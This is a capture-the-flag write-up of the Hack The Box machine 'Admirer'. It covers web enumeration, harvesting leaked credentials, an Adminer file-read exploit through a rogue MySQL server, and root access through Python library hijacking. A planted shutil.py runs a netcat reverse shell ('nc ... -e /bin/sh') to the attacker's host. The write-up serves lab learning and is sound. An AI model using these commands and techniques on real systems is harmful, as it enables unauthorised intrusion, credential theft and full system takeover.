---
title:  "HTB Admirer"
date:  2020-09-27 01:00:00 +0930
tags: [HTB]
---

An interesting box which gets you to practice enumeration. You'll be hunting around for credentials that increases your access step by step. You'll be required to find a known exploit in open source software that you need to read and understand rather then just download and execute a script. By successfully completing this box you take your first step away from being "just a script-kiddy".

***

![](/images/HTB_Admirer/HTB_Admirer.png)

## Enumeration
As per usual we start of with an NMAP scan:
{% highlight bash %}
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 05:40 EDT
Nmap scan report for 10.10.10.187
Host is up (0.32s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.82 seconds
{% endhighlight %}

I can see a website being severed so I check that out:

![](/images/HTB_Admirer/HTB_Admirer_1.png)

Webstie doesn't give me any clues right now neither does the source code. However the nmap scan did make a note of a disallowed entry in the robots.txt file, specifically refering to ***/admin-dir***.

However if we try to go to this page we get a ***403 Forbidden***, we don't have permission to access this page. We need to figure out what other pages this site has, for that we can use a tool to enumerate the web site.

For this I will use ***gobuster*** along with a wordlist in-built inside Kali Linux:

{% highlight bash %}
kali@kali:~$ gobuster dir -e -u "http://10.10.10.187/" -x php,txt -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/08/27 06:15:42 Starting gobuster
===============================================================
http://10.10.10.187/.hta (Status: 403)
http://10.10.10.187/.hta.txt (Status: 403)
http://10.10.10.187/.hta.php (Status: 403)
http://10.10.10.187/.htaccess (Status: 403)
http://10.10.10.187/.htaccess.php (Status: 403)
http://10.10.10.187/.htaccess.txt (Status: 403)
http://10.10.10.187/.htpasswd (Status: 403)
http://10.10.10.187/.htpasswd.php (Status: 403)
http://10.10.10.187/.htpasswd.txt (Status: 403)
http://10.10.10.187/assets (Status: 301)
http://10.10.10.187/images (Status: 301)
http://10.10.10.187/index.php (Status: 200)
http://10.10.10.187/index.php (Status: 200)
http://10.10.10.187/robots.txt (Status: 200)
http://10.10.10.187/robots.txt (Status: 200)
http://10.10.10.187/server-status (Status: 403)
===============================================================
2020/08/27 06:23:35 Finished
===============================================================
{% endhighlight %}

We don't find much there, but we do know of the /admin-dir/ directory, we should also scan that:

{% highlight bash %}
kali@kali:~$ gobuster dir -e -u "http://10.10.10.187/admin-dir/" -x php,txt -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/admin-dir/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/08/27 06:29:04 Starting gobuster
===============================================================
http://10.10.10.187/admin-dir/.hta (Status: 403)
http://10.10.10.187/admin-dir/.hta.php (Status: 403)
http://10.10.10.187/admin-dir/.hta.txt (Status: 403)
http://10.10.10.187/admin-dir/.htaccess (Status: 403)
http://10.10.10.187/admin-dir/.htaccess.php (Status: 403)
http://10.10.10.187/admin-dir/.htaccess.txt (Status: 403)
http://10.10.10.187/admin-dir/.htpasswd (Status: 403)
http://10.10.10.187/admin-dir/.htpasswd.php (Status: 403)
http://10.10.10.187/admin-dir/.htpasswd.txt (Status: 403)
http://10.10.10.187/admin-dir/contacts.txt (Status: 200)
===============================================================
2020/08/27 06:37:01 Finished
===============================================================
{% endhighlight %}

This time I found a "contacts" text file:

{% highlight text %}
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
{% endhighlight %}

Not much in there. We need to keep looking. Eventually, after a while, I got another hit with another world list:

{% highlight bash %}
kali@kali:~$ gobuster dir -e -u "http://10.10.10.187/admin-dir/" -x php,txt -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/admin-dir/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/08/27 06:49:28 Starting gobuster
===============================================================
http://10.10.10.187/admin-dir/.htpasswd (Status: 403)
http://10.10.10.187/admin-dir/.htpasswd.php (Status: 403)
http://10.10.10.187/admin-dir/.htpasswd.txt (Status: 403)
http://10.10.10.187/admin-dir/.htaccess (Status: 403)
http://10.10.10.187/admin-dir/.htaccess.php (Status: 403)
http://10.10.10.187/admin-dir/.htaccess.txt (Status: 403)
http://10.10.10.187/admin-dir/contacts.txt (Status: 200)
http://10.10.10.187/admin-dir/credentials.txt (Status: 200)
===============================================================
2020/08/27 07:23:11 Finished
===============================================================
{% endhighlight %}

The credentials text file stands out, let's see what's inside that:

{% highlight text %}
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
{% endhighlight %}

Here find credentials for Internal mail, FTP, and wordpress. At this point we only know how to access the FTP so let's try that:

{% highlight bash %}
kali@kali:~/HTB/Admirer$ ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
ftp>
{% endhighlight %}

Looks like we have access to two files ***dump.sql*** & ***html.tar.gz***. Let's pull them down to have a look at:

{% highlight bash %}
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (30.0672 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 10.56 secs (487.5702 kB/s)
ftp>
{% endhighlight %}

Let's see what's inside that html archive:

{% highlight bash %}
kali@kali:~/HTB/Admirer$ mkdir html
kali@kali:~/HTB/Admirer$ tar zxf html.tar.gz -C html
kali@kali:~/HTB/Admirer$ cd html/
kali@kali:~/HTB/Admirer/html$ ls -l
total 28
drwxr-x--- 6 kali kali 4096 Jun  6  2019 assets
drwxr-x--- 4 kali kali 4096 Dec  2  2019 images
-rw-r----- 1 kali kali 4613 Dec  3  2019 index.php
-rw-r----- 1 kali kali  134 Dec  1  2019 robots.txt
drwxr-x--- 2 kali kali 4096 Dec  2  2019 utility-scripts
drwxr-x--- 2 kali kali 4096 Dec  2  2019 w4ld0s_s3cr3t_d1r
kali@kali:~/HTB/Admirer/html$
{% endhighlight %}

Looks like this is a backup of what the web server is hosting. Here we learn there is a ***utility-scripts*** directory with some scripts:

{% highlight bash %}
kali@kali:~/HTB/Admirer/html$ ls -l utility-scripts/
total 16
-rw-r----- 1 kali kali 1795 Dec  2  2019 admin_tasks.php
-rw-r----- 1 kali kali  401 Dec  1  2019 db_admin.php
-rw-r----- 1 kali kali   20 Nov 29  2019 info.php
-rw-r----- 1 kali kali   53 Dec  2  2019 phptest.php
{% endhighlight %}

I can confirm these work by browsing to the pages:

![](/images/HTB_Admirer/HTB_Admirer_2.png)

This looks like a work in progress, the admin_tasks page only has 3 basic functions that work. The other pages don't seem to tell us much. I decided to have a look at the code itself and found another bit of information in ***db_admin.php***:

{% highlight bash %}
kali@kali:~/HTB/Admirer/html$ cat utility-scripts/db_admin.php
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
{% endhighlight %}

Here we find credentials to the SQL server. As well as a reminder to himself to finish the implementation of this tool or find an open source alternative. Based on the fact this all looks unfinished they must have found and implemented an alternative. I decided to do another scan, this time on this newly found "utility-scripts" directory:

{% highlight bash %}
kali@kali:~$ gobuster dir -e -u "http://10.10.10.187/utility-scripts/" -x php,txt -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/utility-scripts/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/08/27 07:38:25 Starting gobuster
===============================================================
http://10.10.10.187/utility-scripts/.htaccess (Status: 403)
http://10.10.10.187/utility-scripts/.htaccess.php (Status: 403)
http://10.10.10.187/utility-scripts/.htaccess.txt (Status: 403)
http://10.10.10.187/utility-scripts/.htpasswd (Status: 403)
http://10.10.10.187/utility-scripts/.htpasswd.php (Status: 403)
http://10.10.10.187/utility-scripts/.htpasswd.txt (Status: 403)
http://10.10.10.187/utility-scripts/adminer.php (Status: 200)
http://10.10.10.187/utility-scripts/info.php (Status: 200)
http://10.10.10.187/utility-scripts/phptest.php (Status: 200)
===============================================================
2020/08/27 08:12:11 Finished
{% endhighlight %}

We get a hit on something called ***adminer.php*** so let's check that out:

![](/images/HTB_Admirer/HTB_Admirer_3.png)

Doing a quick web search we learn that ***Adminer*** is "a tool for managing content in MySQL databases. Adminer is distributed under Apache license in a form of a single PHP file. Its author is Jakub Vrána who started to develop this tool as a light-weight alternative to phpMyAdmin, in July 2007."

I  think I get where the name of the box comes from now. :P

Next I use searchsploit to see if there is any known exploits:

{% highlight bash %}
kali@kali:~$ searchsploit adminer
----------------------- ---------------------------------
 Exploit Title         |  Path
----------------------- ---------------------------------
Adminer 4.3.1 - Server | php/webapps/43593.txt
----------------------- ---------------------------------
Shellcodes: No Results
{% endhighlight %}

No Cigar. The version that is on the our server is 4.6.2 so this exploit wouldn't work. Next I try a web search (I use DuckDuckGo) and found [a blog post](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) of a vulnerability found in the version hosted by the server.

## User

Have a read of the blog post to get an understanding of how the exploit works. Basically we need to have a MySQL database going locally on the kali box, then login to this local MySQL database using the Adminer page and dump any files out.

{% highlight bash %}
kali@kali:~/HTB/Admirer$ sudo mysql -u root -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 47
Server version: 10.3.23-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> create database admirer;
Query OK, 1 row affected (0.000 sec)

MariaDB [(none)]> CREATE USER 'final'@'%' IDENTIFIED BY 'final';
Query OK, 0 rows affected (0.017 sec)

MariaDB [(none)]> GRANT ALL ON * . * TO 'final'@'%';
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| admirer            |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.000 sec)

MariaDB [(none)]> use admirer
Database changed
MariaDB [admirer]> create table test (data VARCHAR(225));
Query OK, 0 rows affected (0.028 sec)

{% endhighlight %}

Next we need to change the bind address:

{% highlight bash %}
kali@kali:~$ sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
{% endhighlight %}

I changed the bind address to: ***0.0.0.0***

Next we need to restart the MySQL service:

{% highlight bash %}
kali@kali:~$ systemctl restart mysql
{% endhighlight %}

Note the password for this new user is the same as the username, you can test it out with:

{% highlight bash %}
kali@kali:~/HTB/Admirer$ mysql -h localhost -u final -p
{% endhighlight %}

Next we go back to ***http://10.10.10.187/utility-scripts/adminer.php*** and use these credentials to login back to the server we just locally got up and running. Note the "server" is your local IP address inside the HTB vpn:

![](/images/HTB_Admirer/HTB_Admirer_4.png)

Once logged in it will look like this:

![](/images/HTB_Admirer/HTB_Admirer_5.png)

From here click "SQL command" and use the "load data local" commands to export contents of local files into the "test" table we created inside the database we create and just connected to. Here's the first one I tried:

{% highlight mysql %}
load data local infile '/etc/passwd'
into table test
fields terminated by "/n"
{% endhighlight %}

![](/images/HTB_Admirer/HTB_Admirer_6.png)

Okay so it wasn't going to be that easy haha.

From here we have to try a couple of different files. Eventually I tried the index.php that is on the webserver:

{% highlight mysql %}
load data local infile '/var/www/html/index.php'
into table test
fields terminated by "/n"
{% endhighlight %}

![](/images/HTB_Admirer/HTB_Admirer_7.png)

Looks like that worked. From here we click Export from the left hand menu and click export again. This will open the ***index.php*** on the server for us to view. Here we find Waldo's MySQL credentials in the code.

![](/images/HTB_Admirer/HTB_Admirer_8.png)

{% highlight text %}
('                        $servername = \"localhost\";'),
('                        $username = \"waldo\";'),
('                        $password = \"&<h5b~yK3F#{PaPB&dA}{H>\";'),
('                        $dbname = \"admirerdb\";'),
{% endhighlight %}

So if you recall from the nmap scan there is a SSH server running on this box, one of the next things I try every time I come across new credentials is to try them everywhere I can. You'd be surprised how often people reuse the same password. From experience this is pretty common to reuse your user password for your sql account.

In this case I was able to login to via SSH using the credentials we just found:

{% highlight text %}
kali@kali:~$ ssh waldo@10.10.10.187
waldo@10.10.10.187's password:
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Aug 27 12:35:19 2020 from 10.10.14.43
waldo@admirer:~$
{% endhighlight %}

And from here we get the user flag. :)

{% highlight bash %}
waldo@admirer:~$ pwd
/home/waldo
waldo@admirer:~$ ls -l
total 4
-rw-r----- 1 root waldo 33 Aug 27 05:09 user.txt
waldo@admirer:~$ cat user.txt
9c------------------------------
{% endhighlight %}

## Root

Logged in as the user let's explor what the user ***waldo*** can do:

{% highlight bash %}
waldo@admirer:~$ sudo -l
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
{% endhighlight %}

Looks like they are able to run a script, let's have a look what's in that script:

{% highlight bash %}
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
{% endhighlight %}

It's a long script so I won't copy it all here. One of the functions of the script is to backup the webserver:

{% highlight bash %}
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
{% endhighlight %}

Notice that this calls another script, let's have a look at that:

{% highlight bash %}
waldo@admirer:~$ cat /opt/scripts/backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
{% endhighlight %}

Notice this is creates that archive we pulled from the FTP earlier. But we don't have direct access to run or edit this script. We do have access to one python script at this point though.

From a bit of research I found out that we can use [Privilege Escalation via Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/). Basically we can change the path where Python itself looks for ***shutil***. We can create our own shutil and have python use that as it runs that script Waldo has access to.

{% highlight bash %}
waldo@admirer:~$ mkdir shutil
waldo@admirer:~$ cd shutil
waldo@admirer:~/shutil$ nano shutil.py
{% endhighlight %}

Here's what you'll need to put in:

{% highlight text %}
import os

def make_archive(a, b, c):
  os.system('nc 10.10.14.30 4444 -e "/bin/sh"')
{% endhighlight %}

Next we set up an netcat listener to listen on that port we specified in the script we just wrote:

{% highlight bash %}
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...

{% endhighlight %}

And then we execute the script:

{% highlight bash %}
waldo@admirer:~/shutil$ cat shutil.py
import os

def make_archive(a, b, c):
    os.system('nc 10.10.14.30 4444 -e "/bin/sh"')
waldo@admirer:~/shutil$ sudo PYTHONPATH=~/shutil /opt/scripts/admin_tasks.sh
[sudo] password for waldo:

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:~/shutil$
{% endhighlight %}

Our listener gets a response and we can go for root:

{% highlight bash %}
listening on [any] 4444 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.187] 43364
whoami
root
pwd
/home/waldo/shutil
ls
shutil.py
cd /root
ls
root.txt
cat root.txt
bc------------------------------
{% endhighlight %}

## Conclusion

This box was all about enumeration. I also learned about Privilege Escalation via Python Library Hijacking I understand another way would have been [Pentest Monkey's](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) Python Reverse Shell. I think the time I spent doing scans and enumerating the website seemed realistic, although people don't so obviously leave their credentials lying around. This box also gets you to work with SQL databases which admittedly I had to do some re-learning to get right.
